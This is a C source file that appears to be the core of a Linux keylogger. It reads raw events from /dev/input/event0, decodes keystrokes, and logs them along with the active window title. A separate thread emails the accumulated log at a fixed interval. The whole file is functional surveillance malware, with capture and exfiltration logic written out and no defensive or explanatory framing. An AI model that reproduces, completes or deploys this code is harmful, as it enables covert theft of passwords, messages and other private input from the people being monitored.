#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>
#include <pthread.h>
#include <errno.h>
#include <sys/select.h>
#include "file_handler.h"
#include "keyboard_handler.h"
#include "send_email.h"

static volatile sig_atomic_t exit_flag = 0;
static int pipe_fd[2];
pthread_mutex_t file_mutex = PTHREAD_MUTEX_INITIALIZER;
#define BUFFER_SIZE 64
#define KEYCODE_OFFSET 8
#ifndef DURATION
#error "DURATION is not defined"
#endif
#define FILE_EVENT_KEYBOARD "/dev/input/event0"

typedef struct {
    KeyboardHandler keyboard_handler;
    FileHandler file_handler;
    EmailSender sender;
    int fd;
} HandlerContext;

void signal_handler(int sig) {
    if (sig == SIGINT) {
        exit_flag = 1;
        char signal_data = 'x';
        while (write(pipe_fd[1], &signal_data, 1) == -1 && errno == EINTR);
    }
}

int get_key_string(struct xkb_state *state, xkb_keycode_t keycode, char *buffer, int buffer_len) {
    int len = xkb_state_key_get_utf8(state, keycode, buffer, buffer_len);
    if (len + 1 > buffer_len) {
        return 1;
    }
    return 0;
}

int open_file_event_keyboard(int *fd){
    *fd = open(FILE_EVENT_KEYBOARD, O_RDONLY);
    if (*fd == -1){
        fprintf(stderr, "Error open file event keyboard\n");
        return 1;
    }
    return 0;
}

void *read_keyboard(void *arg){
    HandlerContext *context = (HandlerContext*) arg;
    struct input_event ev;
    char key[BUFFER_SIZE];

    while (!exit_flag) {
        char *current_window = NULL;
        int code;

        if (read(context->fd, &ev, sizeof(struct input_event)) == -1) {
            fprintf(stderr, "Error reading event\n");
            pthread_exit((void *)1);
        }

        pthread_mutex_lock(&file_mutex);
        if (get_active_window(context->keyboard_handler.dpy, &current_window)){
            fprintf(stderr, "Error getting active window\n");
        } else {
            if (!(context->keyboard_handler.active_window)){
                context->keyboard_handler.active_window = strdup(current_window);
                FileHandler_write(&(context->file_handler), context->keyboard_handler.active_window);
            } else if (strcmp(context->keyboard_handler.active_window, current_window)) {
                free(context->keyboard_handler.active_window);
                context->keyboard_handler.active_window = strdup(current_window);
                FileHandler_write(&(context->file_handler), context->keyboard_handler.active_window);
            }
            free(current_window);
        }

        if (ev.type == EV_KEY) {
            code = ev.code + KEYCODE_OFFSET;
            if (ev.value == 1) {
                xkb_state_update_key(context->keyboard_handler.state, code, XKB_KEY_DOWN);
                if (!get_key_string(context->keyboard_handler.state, code, key, sizeof(key))) {
                    FileHandler_write(&(context->file_handler), key);
                }
            } else if (ev.value == 0) {
                xkb_state_update_key(context->keyboard_handler.state, code, XKB_KEY_UP);
            }
        }
        pthread_mutex_unlock(&file_mutex);
    }
    pthread_exit((void *)0);
}

void *send_email(void *arg){
    HandlerContext *context = (HandlerContext*) arg;
    while (!exit_flag){
        fd_set read_fds;
        FD_ZERO(&read_fds);
        FD_SET(pipe_fd[0], &read_fds);

        struct timeval tv;
        tv.tv_sec = DURATION * 60;
        tv.tv_usec = 0;

        int select_result = select(pipe_fd[0] + 1, &read_fds, NULL, NULL, &tv);
        if (select_result > 0){
            char buffer[10];
            read(pipe_fd[0], buffer, sizeof(buffer));
            continue;
        } else if (select_result == 0){
            pthread_mutex_lock(&file_mutex);
            send_file_via_email(&(context->sender), &(context->file_handler), &(context->keyboard_handler.active_window));
            pthread_mutex_unlock(&file_mutex);
        } else {
            if (errno == EINTR) continue;
            fprintf(stderr, "Select error: %s\n", strerror(errno));
            pthread_exit((void *)1);
        }
    }
    pthread_exit((void *)0);
}

int context_init(HandlerContext *context){
    int error = 0;
    error = FileHandler_init(&(context->file_handler));
    error = KeyboardHandler_init(&(context->keyboard_handler)) || error;
    error = EmailSender_init(&(context->sender)) || error;
    error = open_file_event_keyboard(&(context->fd)) || error;
    return error;
}

void context_cleanup(HandlerContext *context){
    FileHandler_close(&(context->file_handler));
    if (context->fd != -1){
        close(context->fd);
    }
    KeyboardHandler_cleanup(&(context->keyboard_handler));
    EmailSender_cleanup(&(context->sender));
}

int main() {
    HandlerContext context;
    pthread_t thread_read, thread_send_email;
    void *retval_read, *retval_send;
    int code_read, code_send;
    struct sigaction sa;

    if (pipe(pipe_fd) != 0) {
        fprintf(stderr, "Failed to create pipe\n");
        return EXIT_FAILURE;
    }

    sa.sa_handler = signal_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    if (sigaction(SIGINT, &sa, NULL) == -1) {
        fprintf(stderr, "Error registering signal handler\n");
        return EXIT_FAILURE;
    }

    if (context_init(&context)) {
        context_cleanup(&context);
        return EXIT_FAILURE;
    }

    if (pthread_create(&thread_read, NULL, read_keyboard, &context)){
        fprintf(stderr, "pthread (pthread_read) create failed");
        context_cleanup(&context);
        return EXIT_FAILURE;
    }

    if (pthread_create(&thread_send_email, NULL, send_email, &context)){
        fprintf(stderr, "pthread (pthread_send_email) create failed");
        context_cleanup(&context);
        return EXIT_FAILURE;
    }

    pthread_join(thread_send_email, &retval_send);
    pthread_join(thread_read, &retval_read);
    code_send = (int)(intptr_t)retval_send;
    code_read = (int)(intptr_t)retval_read;
    printf("Thread send exit, value %d\n", code_send);
    printf("Thread read exit, value %d\n", code_read);

    context_cleanup(&context);
    close(pipe_fd[0]);
    close(pipe_fd[1]);
    return code_read || code_send;
}